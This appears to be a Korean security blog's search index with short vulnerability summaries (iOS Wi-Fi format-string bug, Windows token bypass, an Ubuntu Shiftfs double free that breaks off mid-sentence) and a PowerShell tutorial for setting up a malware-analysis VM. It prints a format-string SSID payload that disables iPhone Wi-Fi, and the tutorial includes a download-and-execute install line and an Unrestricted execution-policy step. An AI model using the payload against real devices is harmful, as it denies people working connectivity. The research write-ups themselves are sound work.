<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[하루한줄] IOS wifi RCE 0-day</title>
    <link href="/2021/07/19/fabu1ous/2021-07-19/"/>
    <url>/2021/07/19/fabu1ous/2021-07-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.zecops.com/research/meet-wifidemon-ios-wifi-rce-0-day-vulnerability-and-a-zero-click-vulnerability-that-was-silently-patched/">Meet WiFiDemon – iOS WiFi RCE 0-Day Vulnerability, and a Zero-Click Vulnerability That Was Silently Patched</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>iOS 14.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>iOS 14의 Wi-Fi-Demon에서 발생하는 Format string bug가 패치되었습니다. 공식 공지에는 WiFi DoS로 공개되었지만 ZecOps Mobile EDR Research의 분석 결과에 따르면 zero-click RCE가 가능합니다. Wi-Fi-Demon은 와이파이 연결과 관련된 프로토콜을 처리하는 system daemon으로 root 권한으로 동작하기 때문에 해당 취약점을 악용해 sandbox escape 및 탈옥에 사용될 수도 있습니다.</p><p><code>%p%s%s%s%s%n</code> 과 같이 SSID(이름)에 format string이 포함된 WiFi에 접속한다면 iPhone의 WiFi 및 핫스팟 기능에 영구적인 장애가 발생합니다. WiFi-Demon은 접속한 WiFi의 SSID를 캐쉬 하고 재시작할 때마다 그 파일에서 SSID를 읽기 때문에 재부팅을 해도 해결할 수 없습니다. WiFi DoS는 iOS 14.4에서 패치되었지만 최신 버전인 14.6에선 여전히 zero-click RCE를 이용한 exploit을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>ios</tag>
      
      <tag>wifi</tag>
      
      <tag>dos</tag>
      
      <tag>apple</tag>
      
      <tag>iphone</tag>
      
      <tag>zero-click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 악성코드 분석용 VM 세팅을 자동화해보자! Part 2</title>
    <link href="/2021/07/18/idioth/setting_malware_vm_part2/"/>
    <url>/2021/07/18/idioth/setting_malware_vm_part2/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/07/18/idioth/setting_malware_vm_part2/thumbnail.png"></p><h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요. idioth입니다. 요즘 날씨가 너무 더워서 아무것도 하기가 싫네요… COVID-19도 심해져서 집에서 공부를 하고 있는데 악성코드 분석을 하려고 보니 환경이 세팅된 가상 머신이 없네요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%201.png"></p><p>급하게 깔아버린 Windows입니다. 아무것도 없군요. 하나하나 설치하기가 귀찮습니다. 하지만 저번 시간에 우리가 진행했던 것이 있죠? 오늘은 애플리케이션 설치 및 바탕화면 바로가기, 작업표시줄 고정을 해봅시다!!!</p><center><img src="./SeekPng.com_anime-face-png_136767.png" width="50%" height="50%"></center><p>하지만 그것조차 너무 하기가 귀찮네요…… 그래도 한 번 시작한 일은 마무리 지어야 하니 시작해봅시다.</p><h1 id="Chocolatey"><a href="#Chocolatey" class="headerlink" title="Chocolatey"></a>Chocolatey</h1><p>Linux 계열 운영체제에서 자동 설정 스크립트를 만들 때 패키지 매니저를 사용하여 간단하게 install 합니다.</p><pre><code class="hljs sql">sudo apm <span class="hljs-keyword">install</span> &lt;<span class="hljs-keyword">package</span>&gt;</code></pre><p>하지만 WIndows Powershell이나 명령 프롬프트에서는 그러한 기능이 딱히 생각이 나지 않습니다. 일일이 찾아가서 다운로드를 눌러 Windows Installer 등을 실행하여 설치하는 경우가 많죠.</p><p>간단하게 설치하고 싶은 분들! 소프트웨어 자동화를 하고 싶은 분들!을 위해 Windows에는 <a href="https://chocolatey.org/">chocolatey</a>가 있습니다!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%202.png"></p><p>chocolatey는 우분투의 apm처럼 windows에서 패키지를 명령줄로 다운로드할 수 있게 만들어줍니다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%203.png"></p><p>세상에 그럼 설치를 해보도록 할까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%204.png"></p><p>‘Get Started’를 클릭하면 아래와 같이 설치하는 방법이 나와있습니다. 영어로 적혀 있고 상당히 길죠? 제가 요약해드리도록 하겠습니다. Powershell을 관리자 권한으로 실행한 후 <code>Set-ExecutionPolicy Unrestricted</code>(추후 실행할 우리의 스크립트를 위함 ㅎ)로 설정하고 다음 명령을 복사해 실행해주면 됩니다.</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Scope</span> <span class="hljs-keyword">Process</span> <span class="hljs-literal">-Force</span>; [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="hljs-operator">-bor</span> <span class="hljs-number">3072</span>; <span class="hljs-built_in">iex</span> ((<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://chocolatey.org/install.ps1&#x27;</span>))</code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%205.png"></p><p>chocolatey의 설치가 완료되었다면 어떤 패키지가 있는지 확인해볼 수 없겠죠? Find Packages를 클릭하여 어떤 것들이 있는지 확인해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%206.png"></p><p>8533개의 패키지가 있다네요! ida도 있는지 확인을 해볼까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%207.png"></p><p>IDA free의 최신 버전이 올라와있는 것을 확인할 수 있습니다! 사실 첫 스크립트를 작성하고 게시글을 준비할 때 hex-rays 기능이 없는 IDA만 업로드되어 있어서 함수를 짜서 다운로드를 하도록 하였으나… 게시글을 올릴 시점이 되니까 업데이트가 되어 있더라고요? 하핫…</p><p>아무튼! chocolatey를 설치하고 난 후에는 apm을 사용하는 것처럼 <code>choco install &lt;package&gt;</code>를 통해 애플리케이션을 설치할 수 있습니다. 세상에 너무 간편하잖아? 업데이트도 똑같이 <code>choco upgrade &lt;package&gt;</code>를 통해 진행할 수 있어요. chocolatey 자체를 업데이트한다면 <code>choco upgrade chocolatey</code>를 해주면 됩니다.</p><p>설치된 애플리케이션들은 보통 <code>%ProgramData%\chocolatey\lib</code>의 하위 폴더에 생성되니 기억해두세요! (Wireshark, HxD, VSCode 등은 본래의 설치 경로에 설치됩니다.)</p><h1 id="Chocolatey를-활용한-애플리케이션-다운로드"><a href="#Chocolatey를-활용한-애플리케이션-다운로드" class="headerlink" title="Chocolatey를 활용한 애플리케이션 다운로드"></a>Chocolatey를 활용한 애플리케이션 다운로드</h1><p>우리에겐 chocolatey가 있으므로 다운로드는 걱정할 필요가 없습니다. 다운로드할 패키지 이름만 정해주면 알아서 다운로드해줄 테니까요.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>&#123;    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    &#123;        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    &#125;&#125;</code></pre><p><code>$packages</code>에 존재하는 패키지는 취향에 따라 추가, 제거, 수정하셔서 사용하시면 됩니다. 매우 매우 간단하죠? 이제 이 스크립트를 실행하여 애플리케이션을 다운로드해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%208.png"></p><p><code>download_apps</code> 함수만 실행했을 뿐인데 알아서 다 다운로드 받아주고 있네요. 호호 기특한 녀석입니다. 그러면 이제 설치된 파일들을 입맛에 따라 바탕화면 바로가기, 작업 표시줄 고정을 해줘야겠죠?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%209.png"></p><blockquote><p><del>아 벌써 귀찮다.. 그냥 침대에 누워서 쉬고 싶다…</del></p></blockquote><h1 id="바탕화면-바로가기-만들기"><a href="#바탕화면-바로가기-만들기" class="headerlink" title="바탕화면 바로가기 만들기"></a>바탕화면 바로가기 만들기</h1><p>Powershell 스크립트를 사용해 바탕화면 바로가기를 만드는 작업은 매우 간단합니다. WScript를 통해 CreateShortcut만 해주면 돼요!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()&#125;</code></pre><p><code>$src</code>는 바로가기를 만들 파일의 경로, <code>$filename</code>은 바로가기로 생성될 파일 이름입니다. 바탕화면에 생성할 것이기 때문에 <code>$dst</code>는 바탕화면으로 고정이 되어있지만, 다른 곳에 만드는 걸 선호한다! 하시면 수정하셔도 되고 <code>$dst</code> 자체를 파라미터로 받으셔도 상관없습니다. :)</p><p>요로코롬 해주면 간단하게 바탕화면 바로가기도 생성 가능!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2010.png"></p><p>뭐야… 이 부분은 너무 쉽잖아? 작업 표시줄 고정도 단숨에 해치워 버려야겠군…</p><h1 id="작업-표시줄-고정하기"><a href="#작업-표시줄-고정하기" class="headerlink" title="작업 표시줄 고정하기"></a>작업 표시줄 고정하기</h1><p>바탕화면 바로가기는 매우 매우 단순했죠? 작업 표시줄 고정하는 것도 매우 매우 단순합니다! 3줄이면 돼요!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)&#125;</code></pre><p>자 이제 이걸 실행해주면 됩니다! 아하하 너무 쉽다!</p><p>.</p><p>.</p><p>.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2011.png"></p><p>놀라울 만큼 아무 일도 일어나지 않았습니다. 왜지??? 무슨 일이지??? <code>$pin.Verbs()</code>를 통해 확인을 해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2012.png"></p><p>없습니다. 네. 작업 표시줄에 고정이 없어요.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2013.png"></p><p>여기에는 있는데 왜? 왜 저기에는 없는 거지…??? 하지만 인생에 불가능은 없는 법. 없으면 만들어주면 되지 않을까요?</p><p>아래의 코드를 통해 <code>Verbs()</code>에 Taskbar pin 기능을 활성화해봅시다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler<span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)</code></pre><p><code>$value_data</code>는 <code>Windows.taskbarpin</code>의 <code>ExplorerCommandHandler</code>의 값을 가져옵니다. 그 후 <code>HKEY_CURRENT_USER</code>에 <code>Classes</code>에 <code>shell</code>과 <code>taskbarpin</code>을 만들어서 해당 핸들러의 값을 추가해주면 됩니다. <code>$pin.verbs()</code>로 확인을 해볼까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2014.png"></p><p>taskbarpin이 추가된 것을 확인할 수 있습니다! 이제 <code>$pin.InvokeVerb(&quot;taskbarpin&quot;)</code>을 통해 <code>taskbarpin</code>을 호출해봅시다. 제발 되기를 바라며!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2015.png"></p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2016.png"></p><p>실험 삼아 vscode의 경로를 줬는데 성공적으로 추가되었네요! 이제 원하는 것들을 작업 표시줄에 추가해주면 됩니다. 하지만 그전에…</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2017.png"></p><p>여기에 우리가 만든 <code>taskbarpin</code>이 남아있네요…? 이 녀석의 레지스트리를 지워야겠어요.</p><pre><code class="hljs powershell"><span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)<span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)&#125;</code></pre><p>짠. 이렇게 그냥 지워버리면 됩니다!</p><h1 id="전체-코드"><a href="#전체-코드" class="headerlink" title="전체 코드"></a>전체 코드</h1><p>이제 완성을 해버렸네요. <code>application.psm1</code>의 전체 코드를 확인해봅시다!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>&#123;    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    &#123;        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    &#125;&#125;<span class="hljs-comment"># refer: https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()&#125;<span class="hljs-comment"># refer: https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler    <span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)    &#123;        <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)    &#125;&#125;</code></pre><p>생각보다 기능이 많이 없죠? 하지만 이걸로도 간단하게 자동화 스크립트를 만들 수 있다는 사실! 이전에 만들었던 <code>install.ps1</code>에 원하는 부분을 추가하고 실행을 해봅시다. +_+</p><pre><code class="hljs powershell"><span class="hljs-comment"># download apps</span>download_apps<span class="hljs-comment"># create desktop shortcut</span>create_desktop_shortcut <span class="hljs-string">&quot;C:\Program Files\Wireshark\Wireshark.exe&quot;</span> <span class="hljs-string">&quot;Wireshark&quot;</span><span class="hljs-comment"># pin taskbar</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp64.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\die\tools\die_win64_portable\die.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\PeStudio\tools\pestudio\pestudio.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\Program Files\Microsoft VS Code\Code.exe&quot;</span></code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2018.png"></p><p>짠! 우리가 고대하던 것들이 스크립트 하나로 끝났습니다. 작업 표시줄에도 고정되었고, Wireshark도 바탕화면 바로가기로 만들어졌네요!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2019.png"></p><p>하얗게 불태워 버렸습니다.</p><h1 id="마치며…"><a href="#마치며…" class="headerlink" title="마치며…"></a>마치며…</h1><p>기술적으로 어려운 부분도 아니고 단지 처음 만들고 찾아보기가 굉장<del>~</del>히 귀찮은 작업이라고 생각합니다. 사실상 기능들은 stack overflow에 다 나와 있어서 현재 버전에 사용되지 않으면 사용되는 부분을 찾거나 하면 되거든요. 해당 스크립트는 <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">MSEdge on Win10 (x64) Stable 1809 버전</a>을 기준으로 작성되었습니다. 악성코드 분석을 할 때 항상 저걸 사용해서 하거든요 :)</p><p>따라서 현재 OS 버전 21H1에서는 동작하지 않을 수도 있습니다. (실제로 로컬에 테스트를 했을 때 작업표시줄 고정이 안되더군요… 일시적인 건가? 아무튼 이것 때문에 삽질을 좀 했습니다… ㅠㅠ)</p><p>추가적으로 아쉬운 부분은 Windbg Preview 버전을 자동으로 설치하고 싶었는데, Store apps를 스크립트로 옮기는 과정이 복잡하더군요. 다운로드 링크를 직접 주는 사이트를 발견해서 작업을 해보았으나, 권한이 없다는 말이 계속 떠서… ㅜㅜ 깔끔하게 포기했습니다. 나중에 chocolatey에 추가되길 간절히 기원하고 있습니다.</p><p>잡담이 길었네요! 제가 많이 사용하는 애플리케이션만 추가해놓고, 저는 보통 시작 - 검색 기능으로 애플리케이션을 실행하는 것을 선호해서 (깔끔한 걸 좋아합니다.) 사실 바탕화면 바로가기나 작업 표시줄 고정 기능을 많이 사용하지 않아요. 이 부분도 취향에 맞게 수정하셔서 사용하시면 됩니다.</p><p>전체 소스 코드는 <a href="https://github.com/idioth/malvm">github</a>에 업로드되어 있으니, 많은 구경 부탁드리고 피드백 또한 언제나 환영입니다! 감사합니다 :)</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/">https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</a></p><p><a href="https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10">https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>powershell</tag>
      
      <tag>automated</tag>
      
      <tag>virtual machine</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows: CreateProcessWithLogon Write Restricted Service EoP</title>
    <link href="/2021/07/16/j0ker/2021-07-16/"/>
    <url>/2021/07/16/j0ker/2021-07-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2194">https://bugs.chromium.org/p/project-zero/issues/detail?id=2194</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Vista 이후로 <code>Windows Service Hardening</code>이라는 미티게이션이 추가되었었습니다. 이 미티게이션의 기능 중 하나가 <code>Write Restrict token</code>인데, 이는 해당 토큰을 가진 프로세서에서는 다른 리소스에 쓰기가 제한되는 미티게이션입니다. 현재 Windows 10에서는 대략 10개의 서비스에 해당 미티게이션이 적용되어 있다고 합니다.</p><p>James Forshaw가 이번에 찾은 취약점(비록 마이크로소프트가 취약점이라고 인정하진 않았지만…)은 이 미티게이션을 우회할 수 있습니다. <code>Write Restriction</code>이 걸린 서비스 프로세스에서 <code>CreateProcessWithLogon</code> 함수에 <code>LOGON_NERCREDENTIALS_ONLY</code> 플래그를 세팅하고 호출할 시 Write Restriction이 적용되지 않은 새로운 프로세스를 실행할 수 있습니다. 새로운 프로세스는 Write Restriction이 걸려있지 않을 뿐 아니라 <code>INTERACTIVE</code> 그룹 SID가 추가됩니다. 또한 이 취약점은 <code>LOCAL SERVICE</code>, <code>NETWORK SERVICE</code> 또는 <code>Virtual Service Account</code> 계정에서도 트리거가 가능하며 <code>SeImpersonatePrivilege</code>나 <code>SeAssignPrimaryTokenPrivilege</code> 같은 권한이 필요하지도 않습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>token</tag>
      
      <tag>createprocesswithlogon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3492: Ubuntu Shiftfs driver double free vulnerability</title>
    <link href="/2021/07/15/idioth/2021-07-15/"/>
    <url>/2021/07/15/idioth/2021-07-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.synacktiv.com/publications/exploitation-of-a-double-free-vulnerability-in-ubuntu-shiftfs-driver-cve-2021-3492.html">EXPLOITATION OF A DOUBLE FREE VULNERABILITY IN UBUNTU SHIFTFS DRIVER (CVE-2021-3492)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ubuntu Groovy (20.10, kernel 5.8.0-50.56 이전 버전)</li><li>Ubuntu Focal (20.04, kernel 5.4.0-72.80 이전 버전)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Pwn2Own Vancouver 2021에서 Ubuntu Groovy (20.10)과 Ubuntu Focal (20.04)의 Shiftfs 드라이버에서 double free 버그가 발견되었습니다.</p><p>shiftfs는 파일 시스템 드라이버로 디렉터리를 bind-mount 하고 마운트한 user namespace owner의 맵을 통해 UID와 GID를 shift 할 수 있는 overlay 종류의 파일 시스템입니다. shiftfs는 특정 ioctl로 핸들링되며 허용된 ioctl을 전달받을 시 <code>shiftfs_real_ioctl</code>을 호출합니다. <code>BTRFS_IOC_SNAP_CREATE</code> ioctl이 사용되면 <code>shiftfs_btrfs_ioctl_fd_replace</code> 함수는 userspace에서 kernel space로 구조체를 복사하여 <code>btrfs_ioctl_vol_args</code> 구조체에 포함된 파일 디스크립터를 bottom 파일 시스템의 inode에 연결된 새 디스크립터로 교체하여 legacy btrfs ioctl을 래핑합니다.</p><p>이 ioctl이 shiftfs 파일에서 수행되면 핸들링 코드는 <code>btrfs_ioctl_vol_args</code>를 userpsace에서 kernel space로 복사합니다. 이 구조체에서 <code>fd</code>를 교체한 후 다시 userspace로 복사됩니다. 복사가 실패할 경우, <code>copy_to_user</code> 함수는 남아있는 바이트를 반환하여 양수 값을 반환합니다. 해당 함수를 호출하는 <code>shiftfs_real_ioctl</code>은 음수 값인지 확인하여 오류가 났는지 확인하여 오류가 발생하더라도 <code>shiftfs_btrfs_ioctl_fd_restore</code>를 호출하여 다른 <code>copy_to_user</code>를 실행하고 <code>btrfs_ioctl_vol_args</code> 구조체를 userpace로 보낸 다음 free 합니다.</p><p><code>shiftfs_btrfs_ioctl_fd_restore</code>를 두 번 호출하면 같은 fd를 두 번 닫고 같은 구조체가 두 번 free 됩니다. 해당 구조체는 userspace에서 복사되는 동안 <code>shiftfs_btrfs_ioctl_fd_replace</code>에 할당되며 커널 함수 <code>memdup_user</code>는 <code>copy_from_user</code>와 동시에 